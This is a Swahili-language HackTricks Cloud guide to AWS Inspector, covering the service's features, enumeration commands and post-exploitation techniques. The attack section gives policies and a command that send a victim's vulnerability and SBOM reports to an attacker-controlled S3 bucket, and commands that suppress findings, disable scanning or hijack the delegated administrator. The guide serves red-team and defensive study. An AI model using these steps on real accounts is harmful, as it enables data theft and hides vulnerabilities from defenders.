# AWS - Ukaguzi Enum

{% hint style="success" %}
Jifunze na zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya GCP (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>unga mkono HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Ukaguzi

Amazon Inspector ni huduma ya usimamizi wa hatari ya kiotomatiki ya hali ya juu iliyoundwa kuboresha usalama wa mazingira yako ya AWS. Huduma hii inafanya ukaguzi wa mara kwa mara wa mifano ya Amazon EC2, picha za kontena katika Amazon ECR, Amazon ECS, na kazi za AWS Lambda kwa ajili ya hatari na upenyezaji usio wa makusudi wa mtandao. Kwa kutumia database imara ya upelelezi wa hatari, Amazon Inspector hutoa matokeo ya kina, ikiwa ni pamoja na viwango vya ukali na mapendekezo ya urekebishaji, kusaidia mashirika kutambua na kushughulikia hatari za usalama kwa njia ya kujitolea na kushughulikia hatari. Mbinu hii kamili inahakikisha nafasi imara ya usalama kote kwenye huduma mbalimbali za AWS, ikisaidia katika utekelezaji wa kanuni na usimamizi wa hatari.

## Vipengele muhimu

### Matokeo

Matokeo katika Amazon Inspector ni ripoti za kina kuhusu hatari na upenyezaji uliogunduliwa wakati wa ukaguzi wa mifano za EC2, makusanyo ya ECR, au kazi za Lambda. Kulingana na hali yake, matokeo hupangwa kama ifuatavyo:

- **Tendaji**: Matokeo hayajarekebishwa.
- **Fungwa**: Matokeo yamefanyiwa marekebisho.
- **Kuzuiwa**: Matokeo yamepewa hali hii kutokana na moja au zaidi ya **kanuni za kuzuia**.

Matokeo pia hupangwa katika aina tatu zifuatazo:

- **Pakiti**: Matokeo haya yanahusiana na hatari katika programu zilizowekwa kwenye rasilimali zako. Mifano ni pamoja na maktaba zilizopitwa na wakati au tegemezi zenye masuala ya usalama yanayojulikana.
- **Msimbo**: Kategoria hii inajumuisha hatari zilizopatikana katika msimbo wa programu zinazoendesha kwenye rasilimali zako za AWS. Matatizo ya kawaida ni makosa ya kuandika au mazoea hafifu ambayo yanaweza kusababisha uvunjaji wa usalama.
- **Mtandao**: Matokeo ya mtandao yanatambua upenyezaji wa uwezekano katika mipangilio ya mtandao ambayo inaweza kutumiwa na wachomaji. Hizi ni pamoja na bandari zilizofunguliwa, itifaki dhaifu za mtandao, na vikundi vya usalama vilivyopangwa vibaya.

### Vichujio na Kanuni za Kuzuia

Vichujio na kanuni za kuzuia katika Amazon Inspector husaidia katika usimamizi na kupanga matokeo. Vichujio huruhusu kurekebisha matokeo kulingana na vigezo maalum, kama vile ukali au aina ya rasilimali. Kanuni za kuzuia huruhusu kuzuia matokeo fulani yanayochukuliwa kuwa hatari ndogo, tayari yamepatikana, au kwa sababu nyingine muhimu, kuzuia matokeo hayo kuzidi katika ripoti zako za usalama na kuruhusu kuzingatia masuala muhimu zaidi.

### Orodha ya Vifaa vya Programu (SBOM)

Orodha ya Vifaa vya Programu (SBOM) katika Amazon Inspector ni orodha iliyopangwa inayoweza kusafirishwa inayoelezea vipengele vyote ndani ya pakiti ya programu, ikiwa ni pamoja na maktaba na tegemezi. SBOMs husaidia kutoa uwazi katika ugavi wa programu, kuruhusu usimamizi bora wa hatari na utekelezaji wa kanuni. Ni muhimu kwa kutambua na kupunguza hatari zinazohusiana na programu za chanzo wazi na za mtu wa tatu.

## Vipengele muhimu

### Usafirishaji wa Matokeo

Amazon Inspector inatoa uwezo wa kusafirisha matokeo kwenda Kikapu cha Amazon S3, Amazon EventBridge na AWS Security Hub, ambayo inakuwezesha kuzalisha ripoti za kina za hatari na upenyezaji uliothibitishwa kwa uchambuzi zaidi au kushiriki kwa tarehe na wakati maalum. Kipengele hiki kinatoa muundo mbalimbali wa pato kama CSV na JSON, kufanya iwe rahisi kuingiliana na zana na mifumo mingine. Kazi ya kusafirisha inaruhusu ubinafsishaji wa data iliyomo katika ripoti, ikikuruhusu kuchuja matokeo kulingana na vigezo maalum kama vile ukali, aina ya rasilimali, au muda wa tarehe na kwa kawaida kujumuisha matokeo yote katika Mkoa wa AWS wa sasa na hali ya Tendaji.

Wakati wa kusafirisha matokeo, ufunguo wa Huduma ya Usimamizi wa Kielelezo (KMS) ni lazima ili kusimbua data wakati wa usafirishaji. Vifunguo vya KMS vinahakikisha kuwa matokeo yaliyosafirishwa yanalindwa dhidi ya ufikiaji usiohalali, kutoa safu ya ziada ya usalama kwa habari nyeti ya hatari.

### Ukaguzi wa mifano ya Amazon EC2

Amazon Inspector inatoa uwezo imara wa ukaguzi wa mifano ya Amazon EC2 ili kugundua hatari na masuala ya usalama. Inspector hulinganisha metadata iliyochimbuliwa kutoka kwa mifano ya EC2 dhidi ya kanuni kutoka kwa ushauri wa usalama ili kuzalisha hatari za pakiti na masuala ya kufikika kwa mtandao. Ukaguzi huu unaweza kufanywa kupitia njia za **msingi wa wakala** au **bila wakala**, kulingana na mipangilio ya aina ya ukaguzi ya akaunti yako.

- **Kulingana na Wakala**: Hutumia wakala wa Meneja wa Mifumo ya AWS (SSM) kufanya ukaguzi wa kina. Njia hii inaruhusu ukusanyaji wa data na uchambuzi kamili moja kwa moja kutoka kwa mifano.
- **Bila Wakala**: Hutoa mbadala mwepesi ambao hauhitaji kusakinisha wakala kwenye mifano, kwa kuchukua picha ya EBS ya kila kiasi cha mifano ya EC2, kutafuta hatari, na kisha kufuta; kwa kutumia miundombinu iliyopo ya AWS kwa ukaguzi.

Aina ya ukaguzi inaamua ni njia ipi itatumika kufanya ukaguzi wa EC2:

- **Kulingana na Wakala**: Inahusisha kusakinisha wakala wa SSM kwenye mifano ya EC2 kwa ukaguzi wa kina.
- **Ukaguzi wa Hibridi**: Unachanganya njia za kulingana na wakala na bila wakala ili kufikia chanjo kubwa na kupunguza athari kwa utendaji. Kwenye mifano ya EC2 ambapo wakala wa SSM umesakinishwa, Inspector atafanya ukaguzi kulingana na wakala, na kwa wale ambapo hakuna wakala wa SSM, ukaguzi utafanywa bila wakala.

Kipengele kingine muhimu ni **ukaguzi wa kina** kwa mifano ya EC2 za Linux. Kipengele hiki kinatoa uchambuzi kamili wa programu na usanidi wa mifano ya EC2 za Linux, kutoa tathmini ya kina ya hatari, ikiwa ni pamoja na hatari za mfumo wa uendeshaji, hatari za programu, na makosa ya usanidi, kuhakikisha tathmini kamili ya usalama. Hii inafikiwa kupitia ukaguzi wa **njia za desturi** na vijarida vyake vyote. Kwa chaguo-msingi, Amazon Inspector itafanya ukaguzi wa yafuatayo, lakini kila akaunti ya mwanachama inaweza kufafanua hadi njia 5 za desturi zaidi, na kila msimamizi aliyeteuliwa hadi 10:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Ukaguzi wa picha za kontena za Amazon ECR

Amazon Inspector hutoa uwezo imara wa ukaguzi wa picha za kontena za Amazon Elastic Container Registry (ECR), kuhakikisha kuwa hatari za pakiti zinagunduliwa na kusimamiwa kwa ufanisi.

- **Ukaguzi wa Msingi**: Hii ni ukaguzi wa haraka na mwepesi unaotambua hatari za pakiti za OS zilizojulikana katika picha za kontena kwa kutumia seti ya kawaida ya kanuni kutoka kwa mradi wa wazi wa Clair. Kwa usanidi huu wa ukaguzi, makusanyo yako yatafanyiwa ukaguzi wakati wa kusukuma, au kufanya ukaguzi wa mwongozo.
- **Ukaguzi Ulioboreshwa**: Chaguo hili huongeza kipengele cha ukaguzi endelevu kando na ukaguzi wa kusukuma. Ukaguzi ulioboreshwa unachimba kwa kina katika safu za kila picha ya kontena ili kutambua hatari katika pakiti za OS na pakiti za lugha za programu kwa usahihi zaidi. Inachambua picha ya msingi na safu zingine zozote, ikitoa mtazamo kamili wa masuala ya usalama yanayowezekana.

### Ukaguzi wa kazi za AWS Lambda

Amazon Inspector inajumuisha uwezo wa kina wa ukaguzi wa kazi za AWS Lambda na safu zake, kuhakikisha usalama na uadilifu wa programu zisizo na seva. Inspector inatoa aina mbili za ukaguzi kwa kazi za Lambda:

- **Ukaguzi wa kawaida wa Lambda**: Kipengele hiki cha msingi kinatambua hatari za programu katika tegemezi za pakiti za programu zilizoongezwa kwenye kazi yako ya Lambda na safu. Kwa mfano, ikiwa kazi yako inatumia toleo la maktaba kama python-jwt lenye hatari inayojulikana, inazalisha matokeo.
- **Ukaguzi wa msimbo wa Lambda**: Inachambua msimbo wa maombi ya desturi kwa masuala ya usalama, kutambua hatari kama vile kasoro za kuingiza, uvujaji wa data, kriptografia dhaifu, na ukosefu wa kusimbua. Inachukua vipande vya msimbo vinavyoonyesha hatari zilizogunduliwa, kama vile vibali vilivyowekwa kwa nguvu. Matokeo ni pamoja na mapendekezo ya urekebishaji ya kina na vipande vya msimbo kwa kurekebisha masuala.
### **Uchunguzi wa Kituo cha Usalama wa Mtandao (CIS)**

Amazon Inspector inajumuisha uchunguzi wa CIS ili kupima mifumo ya uendeshaji ya kifaa cha Amazon EC2 dhidi ya mapendekezo bora kutoka Kituo cha Usalama wa Mtandao (CIS). Uchunguzi huu huhakikisha kuwa mipangilio inazingatia viwango vya usalama vya tasnia.

- **Mipangilio**: Uchunguzi wa CIS huchambua ikiwa mipangilio ya mfumo inakidhi mapendekezo maalum ya CIS Benchmark, huku kila ukaguzi ukihusishwa na kitambulisho na kichwa cha ukaguzi wa CIS.
- **Utekelezaji**: Uchunguzi hufanywa au kupangwa kulingana na vitambulisho vya kifaa na ratiba zilizowekwa.
- **Matokeo**: Matokeo baada ya uchunguzi huonyesha ni ukaguzi upi ulipita, uliorukwa, au kushindwa, hivyo kutoa ufahamu kuhusu hali ya usalama ya kila kifaa. 

## Urambazaji
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## Baada ya Uvamizi

{% hint style="success" %}
Kutoka mtazamo wa mshambuliaji, huduma hii inaweza kumsaidia mshambuliaji kupata mapungufu na upenyezaji wa mtandao ambao unaweza kumsaidia kudukua mifano/maakasha mengine.

Hata hivyo, mshambuliaji pia anaweza kuwa na nia ya kuvuruga huduma hii ili muathirika asione mapungufu (yote au maalum).
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

Mshambuliaji anaweza kutengeneza ripoti za kina za mapungufu au orodha ya vifaa vya programu (SBOMs) na kuzituma nje ya mazingira yako ya AWS. Taarifa hii inaweza kutumiwa kuchunguza udhaifu maalum, programu zilizopitwa na wakati, au tegemezi zisizo salama, kuruhusu mashambulizi yaliyolengwa.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
1. **Tengeneza Bakuli la Amazon S3** na ambatanisha sera ili liweze kufikiwa kutoka kwa Amazon Inspector wa mwathiriwa:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Tengeneza ufunguo wa Amazon KMS** na ambatanisha sera nayo ili uweze kutumiwa na Amazon Inspector wa mwathiriwa:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. Tekeleza amri ya **kuunda ripoti za matokeo** ikiondoa:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **Athari Inayoweza Kutokea**: Kizazi na utoaji wa ripoti za undumilakuwili na programu kwa undani, kupata ufahamu kuhusu udhaifu maalum na mapungufu ya usalama.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

Mshambuliaji anaweza kufuta kizazi cha ripoti maalum za ugunduzi au ripoti ya SBOM, kuzuia timu za usalama kupokea taarifa kwa wakati kuhusu udhaifu na vifaa vya programu (SBOMs), kuchelewesha ugunduzi na urekebishaji wa masuala ya usalama.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **Athari Inayowezekana**: Kuvuruga ufuatiliaji wa usalama na kuzuia ugunduzi na urekebishaji wa wakati wa masuala ya usalama.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

Mshambuliaji mwenye ruhusa hizi angekuwa na uwezo wa kubadilisha sheria za uchujaji ambazo hupitisha ni mapungufu na masuala ya usalama yaliyoripotiwa au kusitishwa (ikiwa **hatua** imewekwa kama¬†SUPPRESS, sheria ya kusitisha ingeanzishwa). Hii inaweza kuficha mapungufu muhimu kutoka kwa watawala wa usalama, hivyo kuwa rahisi kutumia udhaifu huu bila kugunduliwa. Kwa kubadilisha au kuondoa vichujio muhimu, mshambuliaji pia anaweza kuleta kelele kwa kufurika kwa mfumo na matokeo yasiyo na maana, kukwamisha ufuatiliaji na majibu ya usalama kwa ufanisi.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **Athari Inayowezekana**: Kuficha au kuzuia upatikanaji wa mapungufu muhimu, au kufurika kwa mfumo na matokeo yasiyo na maana.

### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

Mshambuliaji anaweza kuvuruga muundo wa usimamizi wa usalama kwa kiasi kikubwa.

- Kwa kulemaza akaunti iliyopewa mamlaka, mshambuliaji anaweza kuzuia timu ya usalama kupata na kusimamia mipangilio na ripoti za Amazon Inspector.
- Kuwezesha akaunti ya msimamizi isiyo halali kunaweza kuruhusu mshambuliaji kudhibiti mipangilio ya usalama, labda kwa kulemaza uchunguzi au kubadilisha mipangilio ili kuficha shughuli za uovu.

{% hint style="warning" %}

Inahitajika akaunti isiyo halali iwe katika Shirika moja na muathiriwa ili iweze kuwa msimamizi aliyepewa mamlaka.

Ili akaunti isiyo halali iwe msimamizi aliyepewa mamlaka, pia inahitajika kwamba baada ya msimamizi halali aliyepewa mamlaka kulemazwa, na kabla ya akaunti isiyo halali kuwezeshwa kama msimamizi aliyepewa mamlaka, msimamizi halali lazima atenguliwe kama msimamizi aliyepewa mamlaka kutoka kwa shirika. Hii inaweza kufanywa kwa amri ifuatayo (inahitaji ruhusa ya **`organizations:DeregisterDelegatedAdministrator`**): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **Athari Inayowezekana**: Kuvuruga usimamizi wa usalama.

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

Mshambuliaji anaweza kubadilisha uunganishaji wa akaunti za wanachama ndani ya shirika la Amazon Inspector. Kwa kuunganisha akaunti zisizoidhinishwa au kutoa uhusiano na zile halali, mshambuliaji anaweza kudhibiti ni akaunti zipi zinajumuishwa katika uchunguzi wa usalama na ripoti. Hii inaweza kusababisha akaunti muhimu kutengwa kutoka kwa ufuatiliaji wa usalama, kuruhusu mshambuliaji kutumia mapungufu katika akaunti hizo bila kugunduliwa.

{% hint style="warning" %}

Hatua hii inahitaji kufanywa na msimamizi aliyepewa jukumu.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **Athari Inayoweza Kutokea**: Kutengwa kwa akaunti muhimu kutoka kwa uchunguzi wa usalama, kuruhusu kutumia mapungufu bila kugundulika.

### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

Mshambuliaji mwenye ruhusa ya `inspector2:Disable` angekuwa na uwezo wa kulemaza uchunguzi wa usalama kwenye aina maalum za rasilimali (EC2, ECR, Lambda, Lambda code) kwenye akaunti zilizotajwa, kuacha sehemu za mazingira ya AWS bila ufuatiliaji na kuwa hatarini kwa mashambulizi. Aidha, kwa kuwa na ruhusa za **`inspector2:Enable`** & **`iam:CreateServiceLinkedRole`**, mshambuliaji basi angeweza kurejesha uchunguzi kwa uchaguzi ili kuepuka kugunduliwa kwa miundo isiyotarajiwa.

{% hint style="warning" %}
Hatua hii inahitaji kufanywa na msimamizi aliyeidhinishwa.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **Athari Inayowezekana**: Kuundwa kwa maeneo ya vipofu katika ufuatiliaji wa usalama.

### `inspector2:UpdateOrganizationConfiguration`

Mshambuliaji mwenye idhini hii angekuwa na uwezo wa kusasisha mipangilio kwa ajili ya shirika lako la Amazon Inspector, ikibadilisha vipengele vya uchunguzi vilivyoanzishwa kwa akaunti mpya za wanachama.

{% hint style="warning" %}

Kitendo hiki kinahitaji kufanywa na msimamizi aliyeteuliwa.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **Athari Inayowezekana**: Kubadilisha sera na mipangilio ya uchunguzi wa usalama kwa shirika.

### `inspector2:TagResource`, `inspector2:UntagResource`

Mshambuliaji anaweza kubadilisha vitambulisho kwenye rasilimali za AWS Inspector, ambazo ni muhimu kwa kuandaa, kufuatilia, na kiotomatiki upimaji wa usalama. Kwa kubadilisha au kuondoa vitambulisho, mshambuliaji anaweza kuficha mapungufu kutoka kwa uchunguzi wa usalama, kuvuruga ripoti za utii, na kuingilia kati na mchakato wa urekebishaji uliojikita, ikisababisha maswala ya usalama yasiyodhibitiwa na uadilifu wa mfumo ulioathiriwa.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **Athari Inayowezekana**: Kuficha mapungufu, kuvuruga ripoti za utii, kuvuruga automatiki ya usalama na kuvuruga mgawanyo wa gharama.

# Marejeo
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


{% hint style="success" %}
Jifunze & zoezi Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze & zoezi Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
